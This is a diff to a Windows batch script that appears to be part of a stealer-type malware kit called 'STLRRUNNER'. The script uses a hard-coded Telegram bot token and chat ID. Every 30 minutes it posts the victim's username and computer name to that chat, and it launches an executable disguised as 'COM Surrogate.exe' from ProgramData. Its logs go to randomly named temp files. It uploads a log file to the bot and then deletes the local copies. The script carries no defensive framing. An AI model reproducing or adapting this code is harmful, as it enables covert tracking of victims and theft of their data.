@@ -1,6 +1,61 @@
 @echo off
 
 
+setlocal enabledelayedexpansion
+
+set "BATCHVERSION=1.2"
+
+set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+set "filename="
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename1=!filename!"
+set "filename="
+set "LOGFILE=%temp%\!filename1!"
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename2=!filename!"
+set "filename="
+set "LOGFILE1=%temp%\!filename2!.mseuop"
+
+
+
+
+
+
+
+
+:: Start logging from this point
+call :LogOutput > "%LOGFILE%" 2>&1
+del /f /q "%LOGFILE%"
+del /f /q "%LOGFILE1%"
+echo.
+echo.
+echo Exiting...
+exit
+
+:LogOutput
+
+
+
+
+
+
+
+
+
+
+
 :: SEND MSG
 
 :: Fucker CHAT ID : -1002163721260
@@ -10,85 +65,170 @@
 :: Set bot token, chat ID, and message
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|30MINLEFTFORSTARTCOM..|%time%"
+set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|30MINLEFTFORSTARTCOM..|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
 
 
+
+
+
+
+echo :CHECKSTLRRUNSTATUS Started
+echo.
+:CHECKSTLRRUNSTATUS
+:: Check if the process is already running
+tasklist /fi "imagename eq STLRRUNNERCALLER.exe" | find /i "STLRRUNNERCALLER.exe" >nul
+if %errorlevel% neq 0 (
+    echo STLRRUNNERCALLER.exe is not running.
+    echo Starting STLRRUNNERCALLER...
+    ::start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
+    echo Not Started.
+) else (
+    echo STLRRUNNERCALLER.exe is already running.
+)
+
+
+
+
+
+
+echo.
+echo Sending"%ENCODED_MESSAGE%"
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
      -d "chat_id=%CHAT_ID%" ^
      -d "text=%ENCODED_MESSAGE%"
 echo Message sent to chat ID %CHAT_ID%
+echo.
+echo Sended
+echo.
 
-
-
+echo.
+echo Waiting 1800 seconds
 timeout /t 1800 /nobreak
+echo.
 
 
+echo Starting COM
 start "" "%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
+echo Started
 
-
-
-set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|COMSTARTED.3H.LEFTFORSTARTCOM..|%time%"
+echo.
+set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|COMSTARTED.3H.LEFTFORSTARTCOM..|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
 
+echo.
+echo Sending"%ENCODED_MESSAGE%"
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
      -d "chat_id=%CHAT_ID%" ^
      -d "text=%ENCODED_MESSAGE%"
+echo Sended.
+echo.
 
 
 
-
-
+echo.
+echo Waiting 1800 seconds
 timeout /t 1800 /nobreak
+echo.
 
 
-set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|2H.30MIN.LEFTFORSTARTCOM..|%time%"
+
+set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|2H.30MIN.LEFTFORSTARTCOM..|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
 
+echo.
+echo Sending"%ENCODED_MESSAGE%"
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
      -d "chat_id=%CHAT_ID%" ^
      -d "text=%ENCODED_MESSAGE%"
+echo Sended.
+echo.
 
 
 
+echo.
+echo Waiting 1800 seconds
 timeout /t 1800 /nobreak
+echo.
 
 
-set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|2H.LEFTFORSTARTCOM..|%time%"
+
+
+set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|2H.LEFTFORSTARTCOM..|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
 
+echo.
+echo Sending"%ENCODED_MESSAGE%"
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
      -d "chat_id=%CHAT_ID%" ^
      -d "text=%ENCODED_MESSAGE%"
+echo Sended.
+echo.
 
 
 
+
+
+
+echo.
+echo Waiting 1800 seconds
 timeout /t 1800 /nobreak
+echo.
 
 
-set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|1H.30MIN.LEFTFORSTARTCOM..|%time%"
+
+
+set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|1H.30MIN.LEFTFORSTARTCOM..|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
 
+echo.
+echo Sending"%ENCODED_MESSAGE%"
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
      -d "chat_id=%CHAT_ID%" ^
      -d "text=%ENCODED_MESSAGE%"
+echo Sended.
+echo.
 
 
-
-
+echo.
+echo Waiting 1800 seconds
 timeout /t 1800 /nobreak
+echo.
 
 
-set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|1H.LEFTFORSTARTCOM..|%time%"
+
+
+set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|1H.LEFTFORSTARTCOM..|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
 
+echo.
+echo Sending"%ENCODED_MESSAGE%"
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
      -d "chat_id=%CHAT_ID%" ^
      -d "text=%ENCODED_MESSAGE%"
+echo Sended.
+echo.
 
 
-
+echo.
+echo Waiting Last 1800 seconds
 timeout /t 1800 /nobreak
+echo.
+echo.
+
+echo Sending msg..
+type "%LOGFILE%" >> "%LOGFILE1%"
+
+
+
+:: Send the file (as a document)
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
+     -F "chat_id=%CHAT_ID%" ^
+     -F "caption=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|FINAL|%time%|(v%BATCHVERSION%)" ^
+     -F "document=@%LOGFILE1%"
+
+
+
 
 
 
